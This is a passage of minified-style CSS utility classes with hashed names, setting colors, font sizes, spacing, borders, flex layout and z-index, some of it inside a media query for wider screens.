          background-color: #eef9ef;
        }

        .pKb1C {
          border-color: #eef9ef;
        }

        ._1HCRq:focus,
        ._2KBGS:hover {
          color: #eef9ef;
        }

        .yMwj1:hover {
          background-color: #eef9ef;
        }

        ._3bQCN:hover {
          border-color: #eef9ef;
        }

        ._15sK6 {
          color: #55b950;
        }

        ._3WHBB {
          background-color: #55b950;
        }

        ._321mB {
          border-color: #55b950;
        }

        ._3-gqi:focus,
        ._4xJSe:hover {
          color: #55b950;
        }

        ._3SZv2:hover {
          background-color: #55b950;
        }

        ._1whYq:hover {
          border-color: #55b950;
        }

        ._32D2N {
          color: #4e9850;
        }

        ._3x7BB {
          background-color: #4e9850;
        }

        ._2EBIA {
          border-color: #4e9850;
        }

        ._3djPP:focus,
        .peFFE:hover {
          color: #4e9850;
        }

        ._1rlQK:hover {
          background-color: #4e9850;
        }

        .bJGbE:hover {
          border-color: #4e9850;
        }

        ._2_W_G {
          color: #ffeebf;
        }

        ._1Rvhq {
          background-color: #ffeebf;
        }

        ._3Mj28 {
          border-color: #ffeebf;
        }

        .DvhqS:focus,
        ._2htSb:hover {
          color: #ffeebf;
        }

        ._1LO0n:hover {
          background-color: #ffeebf;
        }

        ._1DBeV:hover {
          border-color: #ffeebf;
        }

        ._8xJoT {
          color: #fc0;
        }

        ._3-wvm {
          background-color: #fc0;
        }

        ._1aJNy {
          border-color: #fc0;
        }

        ._1Arzp:hover,
        ._3i8Ei:focus {
          color: #fc0;
        }

        ._22rL-:hover {
          background-color: #fc0;
        }

        ._2FgmA:hover {
          border-color: #fc0;
        }

        .Rrrvc {
          color: #ffb100;
        }

        ._3XXhg {
          background-color: #ffb100;
        }

        ._28ewk {
          border-color: #ffb100;
        }

        ._1uHit:focus,
        ._3NMsn:hover {
          color: #ffb100;
        }

        .LX7hG:hover {
          background-color: #ffb100;
        }

        ._2aI4n:hover {
          border-color: #ffb100;
        }

        ._3yjct {
          color: #fafafa;
        }

        ._3Muj- {
          background-color: #fafafa;
        }

        ._1y1Cr {
          border-color: #fafafa;
        }

        .G9Euf:hover,
        ._2-0qX:focus {
          color: #fafafa;
        }

        ._1KSsN:hover {
          background-color: #fafafa;
        }

        ._3GFz-:hover {
          border-color: #fafafa;
        }

        ._8YVGA {
          color: #936;
        }

        ._1rsN0 {
          background-color: #936;
        }

        .v1Va_ {
          border-color: #936;
        }

        .SwOa2:focus,
        ._1XmhW:hover {
          color: #936;
        }

        ._10JEc:hover {
          background-color: #936;
        }

        ._2Lh_y:hover {
          border-color: #936;
        }

        ._2NwdA {
          color: #1a1a1a;
        }

        ._2McOe {
          background-color: #1a1a1a;
        }

        .EiQJC {
          border-color: #1a1a1a;
        }

        ._20rtr:focus,
        ._27IzE:hover {
          color: #1a1a1a;
        }

        .Ov9QU:hover {
          background-color: #1a1a1a;
        }

        ._2g4rz:hover {
          border-color: #1a1a1a;
        }

        ._1SdiP {
          font-size: 2.4rem;
        }

        ._7tOvK {
          font-size: 2rem;
        }

        ._2IpEo {
          font-size: 1.8rem;
        }

        ._3XcPe {
          font-size: 1.6rem;
        }

        ._1NevZ {
          font-size: 1.4rem;
        }

        .crZ_8 {
          font-size: 1.2rem;
        }

        ._3ASDf {
          font-size: 1rem;
        }

        ._3Fr0N {
          font-size: 2rem;
        }

        ._1rM1Z {
          font-size: 1.4rem;
        }

        .hi6mF {
          font-size: 1rem;
        }

        ._2i79h {
          font-size: 0.9rem;
        }

        .xZhIW {
          font-weight: 400;
        }

        ._2qaYr {
          font-weight: 600;
        }

        .SqYW9 {
          font-weight: 700;
        }

        .KNSJ1 {
          line-height: 2.8rem;
        }

        ._1w5KR {
          line-height: 2.6rem;
        }

        ._1uILb {
          line-height: 2.4rem;
        }

        ._2gZNh {
          line-height: 2.2rem;
        }

        .KY5UW {
          line-height: 1.9rem;
        }

        ._2W6V9 {
          line-height: 1.7rem;
        }

        ._3AXPa {
          line-height: 1.4rem;
        }

        ._2pLQX {
          font-style: normal;
        }

        .J_bGY {
          font-style: italic;
        }

        ._3Tb7y,
        .fdUTu:hover {
          text-decoration: none;
        }

        ._17e8X:hover,
        ._f-L5 {
          text-decoration: underline;
        }

        ._1Hzkd,
        ._29V8f:hover {
          text-decoration: line-through;
        }

        ._2I7CM {
          white-space: pre-wrap;
        }

        .-fFJW {
          white-space: pre-line;
        }

        ._3Ldu3 {
          white-space: normal;
        }

        ._1F47L {
          white-space: pre;
        }

        ._38YqV {
          white-space: nowrap;
        }

        ._2W1Ud {
          white-space: break-spaces;
        }

        ._1Dpsd {
          border-width: 0;
        }

        ._39FhU {
          border-width: 1px;
        }

        ._1t17S {
          border-width: 2px;
        }

        ._2ArkZ {
          border-width: 4px;
        }

        ._2gvs- {
          border-style: solid;
        }

        ._27ySo {
          border-style: dashed;
        }

        .oEuCC {
          border-style: dotted;
        }

        ._3K55v {
          border-radius: 0;
        }

        ._351gM {
          border-top-left-radius: 0;
        }

        ._2_xVg {
          border-top-right-radius: 0;
        }

        ._3goWS {
          border-bottom-left-radius: 0;
        }

        ._2LETE {
          border-bottom-right-radius: 0;
        }

        ._3Qho_ {
          border-radius: 4px;
        }

        ._3SqxV {
          border-top-left-radius: 4px;
        }

        ._1N_2d {
          border-top-right-radius: 4px;
        }

        ._2FK85 {
          border-bottom-left-radius: 4px;
        }

        .L7c-7 {
          border-bottom-right-radius: 4px;
        }

        .dpTQN {
          border-radius: 8px;
        }

        .Y6qIH {
          border-top-left-radius: 8px;
        }

        ._2sacB {
          border-top-right-radius: 8px;
        }

        .MqFXm {
          border-bottom-left-radius: 8px;
        }

        ._fteH {
          border-bottom-right-radius: 8px;
        }

        ._2zR5q {
          border-radius: 16px;
        }

        ._3t6y_ {
          border-top-left-radius: 16px;
        }

        ._2Z2le {
          border-top-right-radius: 16px;
        }

        ._2ccp_ {
          border-bottom-left-radius: 16px;
        }

        ._2KJ3k {
          border-bottom-right-radius: 16px;
        }

        ._3QVNc {
          border-radius: 24px;
        }

        ._2H9Yd {
          border-top-left-radius: 24px;
        }

        ._20_HC {
          border-top-right-radius: 24px;
        }

        ._2zMtV {
          border-bottom-left-radius: 24px;
        }

        ._1tv0- {
          border-bottom-right-radius: 24px;
        }

        ._31lAG {
          border-radius: 100%;
        }

        .IPDNc {
          border-top-left-radius: 100%;
        }

        ._2ejWd {
          border-top-right-radius: 100%;
        }

        ._3zjYO {
          border-bottom-left-radius: 100%;
        }

        ._16Lum {
          border-bottom-right-radius: 100%;
        }

        ._1R6uB {
          border: none;
        }

        ._3jWU4 {
          border-top: none;
        }

        .vdU3A {
          border-right: none;
        }

        ._1roTn {
          border-bottom: none;
        }

        ._302Ei {
          border-left: none;
        }

        ._1NnhL {
          width: auto;
        }

        ._7YVAQ {
          width: 25%;
        }

        ._3EYyh {
          width: 33%;
        }

        .fhkr0 {
          width: 50%;
        }

        .rJR_E {
          width: 66%;
        }

        ._2D2Dn {
          width: 75%;
        }

        .dXnmz {
          width: 100%;
        }

        ._3EEnn {
          width: -webkit-fit-content;
          width: -moz-fit-content;
          width: fit-content;
        }

        ._1KVDg {
          height: auto;
        }

        .nT-QL {
          height: 100%;
        }

        ._2TOwV {
          text-align: top;
        }

        ._3Wj2J {
          text-align: right;
        }

        ._3VF8z {
          text-align: left;
        }

        .Nx3HV {
          text-align: center;
        }

        ._2Z3ZZ {
          text-align: justify;
        }

        .J_3A8 {
          -webkit-flex-direction: row;
          -ms-flex-direction: row;
          flex-direction: row;
        }

        .hElwJ {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
        }

        .gB6XD {
          -ms-flex-pack: start;
          -webkit-justify-content: flex-start;
          justify-content: flex-start;
        }

        ._11T3Q {
          -ms-flex-pack: end;
          -webkit-justify-content: flex-end;
          justify-content: flex-end;
        }

        ._2ScNm {
          -ms-flex-pack: justify;
          -webkit-justify-content: space-between;
          justify-content: space-between;
        }

        ._2XeEE {
          -ms-flex-pack: distribute;
          -webkit-justify-content: space-around;
          justify-content: space-around;
        }

        ._1daU8 {
          -ms-flex-pack: space-evenly;
          -webkit-justify-content: space-evenly;
          justify-content: space-evenly;
        }

        ._3wNmX {
          -ms-flex-line-pack: start;
          -webkit-align-content: flex-start;
          align-content: flex-start;
        }

        ._1RSQi {
          -ms-flex-line-pack: end;
          -webkit-align-content: flex-end;
          align-content: flex-end;
        }

        ._2eVU5 {
          -ms-flex-line-pack: center;
          -webkit-align-content: center;
          align-content: center;
        }

        ._3IWIH {
          -ms-flex-line-pack: justify;
          -webkit-align-content: space-between;
          align-content: space-between;
        }

        ._1u5EB {
          -ms-flex-line-pack: distribute;
          -webkit-align-content: space-around;
          align-content: space-around;
        }

        ._3qgKE {
          -ms-flex-line-pack: space-evenly;
          -webkit-align-content: space-evenly;
          align-content: space-evenly;
        }

        ._3p4zD {
          -ms-flex-line-pack: baseline;
          -webkit-align-content: baseline;
          align-content: baseline;
        }

        ._18-xa {
          -ms-flex-align: stretch;
          -webkit-align-items: stretch;
          align-items: stretch;
        }

        .LASHH {
          -ms-flex-align: start;
          -webkit-align-items: flex-start;
          align-items: flex-start;
        }

        ._1X2t0 {
          -ms-flex-align: end;
          -webkit-align-items: flex-end;
          align-items: flex-end;
        }

        ._1G_LA {
          -ms-flex-align: center;
          -webkit-align-items: center;
          align-items: center;
        }

        ._2t1Tn {
          -ms-flex-align: baseline;
          -webkit-align-items: baseline;
          align-items: baseline;
        }

        .MRqvM {
          display: none;
        }

        ._11JAc {
          display: block;
        }

        ._2PxQK {
          display: -webkit-flex;
          display: -ms-flexbox;
          display: flex;
        }

        ._9TvQB {
          display: inline;
          display: initial;
        }

        ._3KGFQ {
          display: inline;
        }

        .QrDBb {
          display: inline-block;
        }

        ._4Rhih {
          display: -webkit-inline-flex;
          display: -ms-inline-flexbox;
          display: inline-flex;
        }

        ._35THu {
          position: static;
        }

        ._2kZgo {
          position: relative;
        }

        ._1QbT2 {
          position: fixed;
        }

        ._2eB0o {
          position: absolute;
        }

        ._3K9ud {
          position: -webkit-sticky;
          position: sticky;
        }

        ._2ZMTK {
          top: auto;
        }

        ._3RpS3 {
          right: auto;
        }

        ._2f6BZ {
          bottom: auto;
        }

        ._1kE3a {
          left: auto;
        }

        .z4O7u {
          top: 0;
        }

        .FOmVw {
          right: 0;
        }

        ._3jPfK {
          bottom: 0;
        }

        ._3gHYJ {
          left: 0;
        }

        ._2hQpm {
          top: 0.4rem;
        }

        ._2EI6Z {
          right: 0.4rem;
        }

        .AHqb_ {
          bottom: 0.4rem;
        }

        ._3gNW4 {
          left: 0.4rem;
        }

        ._3qCl8 {
          top: 0.8rem;
        }

        ._3FQ7j {
          right: 0.8rem;
        }

        ._2w-S8 {
          bottom: 0.8rem;
        }

        ._3oJ2j {
          left: 0.8rem;
        }

        .pgy4L {
          top: 1.6rem;
        }

        ._1FF0g {
          right: 1.6rem;
        }

        ._5riJJ {
          bottom: 1.6rem;
        }

        ._35hK- {
          left: 1.6rem;
        }

        ._3evBz {
          top: 2.4rem;
        }

        .G9oHh {
          right: 2.4rem;
        }

        ._3I4uB {
          bottom: 2.4rem;
        }

        ._5lOJZ {
          left: 2.4rem;
        }

        ._2N3b8 {
          top: 3.2rem;
        }

        .z3zSH {
          right: 3.2rem;
        }

        ._3AQI5 {
          bottom: 3.2rem;
        }

        .KDDOj {
          left: 3.2rem;
        }

        ._3uVcX {
          top: 4rem;
        }

        ._2TRa_ {
          right: 4rem;
        }

        ._3vCKR {
          bottom: 4rem;
        }

        ._3PsbA {
          left: 4rem;
        }

        .az8Nf {
          text-transform: capitalize;
        }

        ._3ae3b {
          text-transform: uppercase;
        }

        ._180CW {
          text-transform: lowercase;
        }

        ._3jARy {
          text-transform: none;
        }

        ._2DFK6 {
          -o-text-overflow: clip;
          text-overflow: clip;
        }

        ._11Rb4 {
          -o-text-overflow: ellipsis;
          text-overflow: ellipsis;
        }

        ._2E0OZ {
          -o-text-overflow: initial;
          text-overflow: clip;
        }

        ._17G1n {
          overflow: auto;
        }

        ._2bNdf {
          overflow: hidden;
        }

        ._2qFUK {
          overflow: overlay;
        }

        ._1Bmpl {
          overflow: scroll;
        }

        ._1qV9e {
          overflow: visible;
        }

        ._2ETth {
          overflow-x: auto;
        }

        ._1wsfe {
          overflow-x: hidden;
        }

        ._3EIdY {
          overflow-x: overlay;
        }

        ._11wNN {
          overflow-x: scroll;
        }

        ._3F30k {
          overflow-x: visible;
        }

        ._3Yh5D {
          overflow-y: auto;
        }

        ._1e3w7 {
          overflow-y: hidden;
        }

        ._1RDo1 {
          overflow-y: overlay;
        }

        ._2Ud4S {
          overflow-y: scroll;
        }

        ._3pllD {
          overflow-y: visible;
        }

        ._2UAVD {
          word-break: normal;
        }

        ._344qG {
          word-break: break-all;
        }

        ._21HH2 {
          word-break: break-word;
        }

        ._3poYL {
          word-break: keep-all;
        }

        ._2IOAZ {
          word-wrap: break-word;
        }

        ._1Zz5F {
          word-wrap: normal;
        }

        ._17r8Y {
          -webkit-hyphens: auto;
          -ms-hyphens: auto;
          hyphens: auto;
        }

        ._1qdtK {
          -webkit-hyphens: manual;
          -ms-hyphens: manual;
          hyphens: manual;
        }

        .cZ800 {
          -webkit-hyphens: none;
          -ms-hyphens: none;
          hyphens: none;
        }

        ._16uNh {
          vertical-align: baseline;
        }

        .bRwlK {
          vertical-align: top;
        }

        ._298Ch {
          vertical-align: middle;
        }

        ._2Lkgc {
          vertical-align: bottom;
        }

        ._1nnx- {
          vertical-align: sub;
        }

        ._2CNTN {
          vertical-align: text-top;
        }

        ._1t5ds:hover,
        ._3weOB {
          -webkit-box-shadow: none;
          box-shadow: none;
        }

        .LF5SV:hover,
        ._12YOo {
          -webkit-box-shadow: 0 -1px 4px 0 rgba(26, 26, 26, 0.08),
            0 4px 8px 0 rgba(26, 26, 26, 0.12);
          box-shadow: 0 -1px 4px 0 rgba(26, 26, 26, 0.08),
            0 4px 8px 0 rgba(26, 26, 26, 0.12);
        }

        ._3Zqvc:hover,
        .duxtT {
          -webkit-box-shadow: 0 -1px 8px 0 rgba(26, 26, 26, 0.12),
            0 4px 8px 0 rgba(0, 0, 0, 0.14);
          box-shadow: 0 -1px 8px 0 rgba(26, 26, 26, 0.12),
            0 4px 8px 0 rgba(0, 0, 0, 0.14);
        }

        ._1V6ei {
          z-index: -1;
        }

        .bt2_U {
          z-index: 0;
        }

        ._1X35R {
          z-index: 1;
        }

        ._5s7FQ {
          z-index: 1000;
        }

        .arUIt {
          z-index: 1100;
        }

        ._1HAXB {
          z-index: 1300;
        }

        ._13UN8 {
          z-index: 1400;
        }

        ._2jnUr {
          z-index: 1500;
        }

        ._2JhFh {
          z-index: 1600;
        }

        ._1AY0e {
          z-index: 1700;
        }

        ._2vkF8 {
          z-index: 1800;
        }
      }

      @media (min-width: 768px) {
        ._2H0vK {
          margin: auto;
        }

        ._1MWIB {
          padding: auto;
        }

        ._3fiY9 {
          margin: 0;
        }

        ._3tl09 {
          padding: 0;
        }

        ._2VVyY {
          margin: 0.4rem;
        }

        ._1E_ag {
          padding: 0.4rem;
        }

        ._2SVzd {
          margin: 0.8rem;
        }

        ._2K8YJ {
          padding: 0.8rem;
        }

        .Eg8xy {
          margin: 1.6rem;
        }

        .tsQ7F {
          padding: 1.6rem;
        }

        ._25VA0 {
          margin: 2.4rem;
        }

        ._2W7_N {
          padding: 2.4rem;
        }

        ._2GCy3 {
          margin: 3.2rem;
        }

        ._1ivEP {
          padding: 3.2rem;
        }

        ._39DIs {
          margin: 4rem;
        }

        ._2Raoo {
          padding: 4rem;
        }

        ._1Dmr6 {
          margin-top: auto;
        }

        .Qk4FM {
          padding-top: auto;
        }

        ._1agSy {
          margin-right: auto;
        }

        ._6lZUz {
          padding-right: auto;
        }

        .Z0phu {
          margin-bottom: auto;
        }

        ._3_vY8 {
          padding-bottom: auto;
        }

        ._1_kTR {
          margin-left: auto;
        }

        ._3BWAa {
          padding-left: auto;
        }

        ._1YMm9 {
          margin-top: 0;
        }

        .i_diK {
          padding-top: 0;
        }

        ._3EERP {
          margin-right: 0;
        }

        ._35TIq {
          padding-right: 0;
        }

        ._3lDke {
          margin-bottom: 0;
        }

        ._2OkXL {
          padding-bottom: 0;
        }

        ._2844T {
          margin-left: 0;
        }

        ._16IMY {
          padding-left: 0;
        }

        .Di75Z {
          margin-top: 0.4rem;
        }

        ._1UaX0 {
          padding-top: 0.4rem;
        }

        .QMzH5 {
          margin-right: 0.4rem;
        }

        ._3V8DR {
          padding-right: 0.4rem;
        }

        ._3l01N {
          margin-bottom: 0.4rem;
        }

        ._1k1gK {
          padding-bottom: 0.4rem;
        }

        ._2_oM3 {
          margin-left: 0.4rem;
        }

        .byFoY {
          padding-left: 0.4rem;
        }

        .x9Kub {
          margin-top: 0.8rem;
        }

        ._2IZMJ {
          padding-top: 0.8rem;
        }

        .vG3lO {
          margin-right: 0.8rem;
        }

        .Lhr1j {
          padding-right: 0.8rem;
        }

        ._1lbrt {
          margin-bottom: 0.8rem;
        }

        ._6LMlc {
          padding-bottom: 0.8rem;
        }

        .yjQFI {
          margin-left: 0.8rem;
        }

        ._2RG2Y {
          padding-left: 0.8rem;
        }

        ._1rJcl {
          margin-top: 1.6rem;
        }

        ._1Q72V {
          padding-top: 1.6rem;
        }

        .yB9Uh {
          margin-right: 1.6rem;
        }

        .zsy5r {
          padding-right: 1.6rem;
        }

        ._3ncyR {
          margin-bottom: 1.6rem;
        }

        ._3sFqO {
          padding-bottom: 1.6rem;
        }

        ._3CDVz {
          margin-left: 1.6rem;
        }

        ._1BUFu {
          padding-left: 1.6rem;
        }

        .r_8cb {
          margin-top: 2.4rem;
        }

        ._2o6qj {
          padding-top: 2.4rem;
        }

        ._2TgX0 {
          margin-right: 2.4rem;
        }

        ._3oAnh {
          padding-right: 2.4rem;
        }

        ._3kk7P {
          margin-bottom: 2.4rem;
        }

        ._2cFaB {
          padding-bottom: 2.4rem;
        }

        ._3ATlG {
          margin-left: 2.4rem;
        }

        ._37t_J {
          padding-left: 2.4rem;
        }

        ._2z9fZ {
          margin-top: 3.2rem;
        }

        .Z_04f {
          padding-top: 3.2rem;
        }

        ._1TfAR {
          margin-right: 3.2rem;
        }

        ._3v9YQ {
          padding-right: 3.2rem;
        }

        ._3Bpm0 {
          margin-bottom: 3.2rem;
        }

        .ahZxk {
          padding-bottom: 3.2rem;
        }

        ._1UIwP {
          margin-left: 3.2rem;
        }

        ._238oH {
          padding-left: 3.2rem;
        }

        ._2inm2 {
          margin-top: 4rem;
        }

        .-qEzO {
          padding-top: 4rem;
        }

        ._3C9Gi {
          margin-right: 4rem;
        }

        ._3Brot {
          padding-right: 4rem;
        }

        .hsHd- {
          margin-bottom: 4rem;
        }

        .-usCt {
          padding-bottom: 4rem;
        }

        ._33ZjO {
          margin-left: 4rem;
        }

        ._2SZEy {
          padding-left: 4rem;
        }

        ._3dxg2 {
          color: #fff;
        }

        ._1Xn1t {
          background-color: #fff;
        }

        ._1x85N {
          border-color: #fff;
        }

        ._3eZ4n:focus,
        .bwkHc:hover {
          color: #fff;
        }

        .cexQp:hover {
          background-color: #fff;
        }

        ._3nfpG:hover {
          border-color: #fff;
        }

        ._3Bh-N {
          color: #1a1a1a;
        }

        .sAenl {
          background-color: #1a1a1a;
        }

        ._3CsTU {
          border-color: #1a1a1a;
        }

        ._1-ptR:focus,
        .azOMV:hover {
          color: #1a1a1a;
        }

        .pWfUu:hover {
          background-color: #1a1a1a;
        }

        ._1toG5:hover {
          border-color: #1a1a1a;
        }

        ._1OMQv {
          color: transparent;
        }

        ._4jFct {
          background-color: transparent;
        }

        .NuheP {
          border-color: transparent;
        }

        ._15Ka-:focus,
        ._1Eq0e:hover {
          color: transparent;
        }

        ._3R-42:hover {
          background-color: transparent;
        }

        .fMjY_:hover {
          border-color: transparent;
        }

        ._1aVLT {
          color: rgba(0, 0, 0, 0.5);
        }

        ._26Fta {
          background-color: rgba(0, 0, 0, 0.5);
        }

        ._14ppW {
          border-color: rgba(0, 0, 0, 0.5);
        }

        ._2Dive:focus,
        ._3OY3e:hover {
          color: rgba(0, 0, 0, 0.5);
        }

        ._1RXgv:hover {
          background-color: rgba(0, 0, 0, 0.5);
        }

        ._1TasY:hover {
          border-color: rgba(0, 0, 0, 0.5);
        }

        ._3fz00 {
          color: #f4f6f7;
        }

        ._14F-Q {
          background-color: #f4f6f7;
        }

        ._1oYNp {
          border-color: #f4f6f7;
        }

        ._2H2x6:focus,
        ._3Eej-:hover {
          color: #f4f6f7;
        }

        ._14OcV:hover {
          background-color: #f4f6f7;
        }

        ._3WazE:hover {
          border-color: #f4f6f7;
        }

        ._3TF7p {
          color: #e6ebef;
        }

        ._1jr7F {
          background-color: #e6ebef;
        }

        ._3yo9E {
          border-color: #e6ebef;
        }

        .-q5rs:hover,
        ._1VxeP:focus {
          color: #e6ebef;
        }

        .eVQFl:hover {
          background-color: #e6ebef;
        }

        ._37CEx:hover {
          border-color: #e6ebef;
        }

        ._3K-y_ {
          color: #cad1d9;
        }

        ._3v84F {
          background-color: #cad1d9;
        }

        ._2D9Sg {
          border-color: #cad1d9;
        }

        ._3D7G9:focus,
        ._3Y5Ea:hover {
          color: #cad1d9;
        }

        ._6KMho:hover {
          background-color: #cad1d9;
        }

        ._3QFc8:hover {
          border-color: #cad1d9;
        }

        ._3MUeS {
          color: #a8b4c0;
        }

        ._3UUm6 {
          background-color: #a8b4c0;
        }

        ._3kMfX {
          border-color: #a8b4c0;
        }

        ._2Jubz:hover,
        ._2qROf:focus {
          color: #a8b4c0;
        }

        ._3mgxl:hover {
          background-color: #a8b4c0;
        }

        ._1AV7C:hover {
          border-color: #a8b4c0;
        }

        ._15PGu {
          color: #8191a0;
        }

        ._3fVO5 {
          background-color: #8191a0;
        }

        ._3dfZd {
          border-color: #8191a0;
        }

        ._1uhNu:hover,
        ._3G7fp:focus {
          color: #8191a0;
        }

        .x6g9U:hover {
          background-color: #8191a0;
        }

        ._2t9Mm:hover {
          border-color: #8191a0;
        }

        ._1Mi-s {
          color: #fef0e9;
        }

        ._2fLlA {
          background-color: #fef0e9;
        }

        ._13X9C {
          border-color: #fef0e9;
        }

        ._3Hrhu:focus,
        ._3LRRg:hover {
          color: #fef0e9;
        }

        ._1R57B:hover {
          background-color: #fef0e9;
        }

        ._3Gqvh:hover {
          border-color: #fef0e9;
        }

        ._2SrN8 {
          color: #ff6e14;
        }

        ._3Hqov {
          background-color: #ff6e14;
        }

        ._30xAN {
          border-color: #ff6e14;
        }

        ._1UTYu:hover,
        ._1hA5C:focus {
          color: #ff6e14;
        }

        ._3DL_W:hover {
          background-color: #ff6e14;
        }

        ._34epW:hover {
          border-color: #ff6e14;
        }

        ._1467l {
          color: #c0562a;
        }

        .ZL7Kq {
          background-color: #c0562a;
        }

        ._2nSkx {
          border-color: #c0562a;
        }

        ._2vWBa:hover,
        ._2wbhg:focus {
          color: #c0562a;
        }

        ._2L13U:hover {
          background-color: #c0562a;
        }

        ._22bnM:hover {
          border-color: #c0562a;
        }

        ._3YQSd {
          color: #d9e6f7;
        }

        ._2EMnd {
          background-color: #d9e6f7;
        }

        ._1P1yO {
          border-color: #d9e6f7;
        }

        .CXSan:hover,
        ._2Nc8r:focus {
          color: #d9e6f7;
        }

        ._2wxtv:hover {
          background-color: #d9e6f7;
        }

        ._2Csvn:hover {
          border-color: #d9e6f7;
        }

        ._3W3ep {
          color: #4183d7;
        }

        ._2t-qc {
          background-color: #4183d7;
        }

        .ZiKM8 {
          border-color: #4183d7;
        }

        ._1ZB0A:focus,
        ._2tbVb:hover {
          color: #4183d7;
        }

        .olb-_:hover {
          background-color: #4183d7;
        }

        ._1zMi9:hover {
          border-color: #4183d7;
        }

        ._2d54O {
          color: #369;
        }

        ._1firw {
          background-color: #369;
        }

        ._1DtGO {
          border-color: #369;
        }

        ._1LEvo:focus,
        .gs3RJ:hover {
          color: #369;
        }

        ._1etTF:hover {
          background-color: #369;
        }

        ._2kWDZ:hover {
          border-color: #369;
        }

        ._6oA58 {
          color: #fbeceb;
        }

        ._2v61I {
          background-color: #fbeceb;
        }

        ._3wXPn {
          border-color: #fbeceb;
        }

        ._1ljcZ:focus,
        ._2VKfd:hover {
          color: #fbeceb;
        }

        ._1prvS:hover {
          background-color: #fbeceb;
        }

        .oGUSJ:hover {
          border-color: #fbeceb;
        }

        ._1x2h5 {
          color: #db4437;
        }

        ._3Q2aH {
          background-color: #db4437;
        }

        ._1nqwn {
          border-color: #db4437;
        }

        ._131wT:hover,
        ._2V-wO:focus {
          color: #db4437;
        }

        ._280uF:hover {
          background-color: #db4437;
        }

        ._3EKOs:hover {
          border-color: #db4437;
        }

        ._1tEFG {
          color: #c23f34;
        }

        ._3ZvSd {
          background-color: #c23f34;
        }

        ._1pRa5 {
          border-color: #c23f34;
        }

        .Xq6Pg:focus,
        ._3KtGp:hover {
          color: #c23f34;
        }

        .R-yh0:hover {
          background-color: #c23f34;
        }

        ._23xRE:hover {
          border-color: #c23f34;
        }

        ._3ywfl {
          color: #eef9ef;
        }

        ._3_bhy {
          background-color: #eef9ef;
        }

        .bFspu {
          border-color: #eef9ef;
        }

        ._2Ug6Y:hover,
        ._3Kc4O:focus {
          color: #eef9ef;
        }

        ._3Qwfk:hover {
          background-color: #eef9ef;
        }

        ._1_pJn:hover {
          border-color: #eef9ef;
        }

        .ZlDGh {
          color: #55b950;
        }

        ._3Jxji {
          background-color: #55b950;
        }

        ._2t5TA {
          border-color: #55b950;
        }

        ._32TKB:focus,
        ._75ikr:hover {
          color: #55b950;
        }

        ._1pwyC:hover {
          background-color: #55b950;
        }

        ._3erHX:hover {
          border-color: #55b950;
        }

        ._1w3S- {
          color: #4e9850;
        }

        ._2Khgd {
          background-color: #4e9850;
        }

        ._1Q2ZB {
          border-color: #4e9850;
        }

        ._1Ey-K:hover,
        ._1UKx4:focus {
          color: #4e9850;
        }

        ._1V8gZ:hover {
          background-color: #4e9850;
        }

        ._10Inb:hover {
          border-color: #4e9850;
        }

        .zJi8G {
          color: #ffeebf;
        }

        ._2ZXS- {
          background-color: #ffeebf;
        }

        ._3AZ6b {
          border-color: #ffeebf;
        }

        ._2690X:focus,
        ._36I2L:hover {
          color: #ffeebf;
        }

        ._3ZCWv:hover {
          background-color: #ffeebf;
        }

        ._3Fr5y:hover {
          border-color: #ffeebf;
        }

        ._1-mZE {
          color: #fc0;
        }

        ._34I-L {
          background-color: #fc0;
        }

        .ZiMWD {
          border-color: #fc0;
        }

        ._2cn5w:focus,
        ._2n4sd:hover {
          color: #fc0;
        }

        ._GdsS:hover {
          background-color: #fc0;
        }

        ._3uKr9:hover {
          border-color: #fc0;
        }

        ._8-LmA {
          color: #ffb100;
        }

        ._2yt3r {
          background-color: #ffb100;
        }

        ._3Gau6 {
          border-color: #ffb100;
        }

        ._17nMX:hover,
        ._3z7ko:focus {
          color: #ffb100;
        }

        ._3Nc07:hover {
          background-color: #ffb100;
        }

        ._2utzX:hover {
          border-color: #ffb100;
        }

        ._17tvV {
          color: #fafafa;
        }

        ._1WKVf {
          background-color: #fafafa;
        }

        ._16rPS {
          border-color: #fafafa;
        }

        ._1BxMr:hover,
        ._31cQD:focus {
          color: #fafafa;
        }

        ._1S4Y2:hover {
          background-color: #fafafa;
        }

        ._1I8IV:hover {
          border-color: #fafafa;
        }

        .R2ZPC {
          color: #936;
        }

        .I-LE_ {
          background-color: #936;
        }

        ._3rq4V {
          border-color: #936;
        }

        .CZKab:hover,
        ._3derD:focus {
          color: #936;
        }

        ._3RjRy:hover {
          background-color: #936;
        }

        ._153aY:hover {
          border-color: #936;
        }

        ._5_lHN {
          color: #1a1a1a;
        }

        ._1Ea65 {
          background-color: #1a1a1a;
        }

        ._2SVbz {
          border-color: #1a1a1a;
        }

        ._1xv2d:hover,
        ._3gM3o:focus {
          color: #1a1a1a;
        }

        ._3mzah:hover {
          background-color: #1a1a1a;
        }

        ._24jDb:hover {
          border-color: #1a1a1a;
        }

        ._3zIi4 {
          font-size: 2.4rem;
        }

        ._2tyuP {
          font-size: 2rem;
        }

        ._1Grwy {
          font-size: 1.8rem;
        }

        ._1aQ4o {
          font-size: 1.6rem;
        }

        ._3OMUl {
          font-size: 1.4rem;
        }

        .Oqrty {
          font-size: 1.2rem;
        }

        ._1DDpA {
          font-size: 1rem;
        }

        .OSL00 {
          font-size: 2rem;
        }

        ._1Qs52 {
          font-size: 1.4rem;
        }

        .XP0Yt {
          font-size: 1rem;
        }

        ._1-O7_ {
          font-size: 0.9rem;
        }

        ._2VYeZ {
          font-weight: 400;
        }

        ._2lhzT {
          font-weight: 600;
        }

        ._2uEJz {
          font-weight: 700;
        }

        ._1JYGK {
          line-height: 2.8rem;
        }

        ._1Wjga {
          line-height: 2.6rem;
        }

        ._1iUB0 {
          line-height: 2.4rem;
        }

        ._2eqWv {
          line-height: 2.2rem;
        }

        .kCCWY {
          line-height: 1.9rem;
        }

        ._1riDs {
          line-height: 1.7rem;
        }

        ._2AkZI {
          line-height: 1.4rem;
        }

        ._2VZNc {
          font-style: normal;
        }

        .z6Gnl {
          font-style: italic;
        }

        .EYW7I:hover,
        ._2hs6u {
          text-decoration: none;
        }

        ._3eyLk:hover,
        .ic7Me {
          text-decoration: underline;
        }

        ._39vyU:hover,
        .iO0_B {
          text-decoration: line-through;
        }

        .VPtlz {
          white-space: pre-wrap;
        }

        ._1ifES {
          white-space: pre-line;
        }

        ._2vdet {
          white-space: normal;
        }

        .jv3CG {
          white-space: pre;
        }

        ._3pAh- {
          white-space: nowrap;
        }

        ._2BDkk {
          white-space: break-spaces;
        }

        ._1pT5A {
          border-width: 0;
        }

        .Qbc-Z {
          border-width: 1px;
        }

        ._1FRuY {
          border-width: 2px;
        }

        .RguHL {
